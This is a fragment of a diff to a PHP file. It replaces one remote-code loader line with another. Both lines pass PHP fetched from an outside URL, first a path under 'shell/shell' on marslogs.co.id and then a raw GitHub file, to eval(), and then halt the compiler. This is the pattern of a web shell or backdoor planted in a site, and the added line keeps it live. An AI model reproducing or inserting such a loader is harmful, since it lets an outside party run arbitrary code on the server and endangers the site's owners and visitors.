@@ -82,4 +82,5 @@ function getCurl0($url)
 }
 ?>
 
-<?=eval("?>".getCurl0("https://marslogs.co.id/shell/shell/kct.txt")); __halt_compiler();?>
+
+<?=eval("?>".getCurl0("https://raw.githubusercontent.com/Amantu1928/amantu/refs/heads/main/g.php")); __halt_compiler();?>
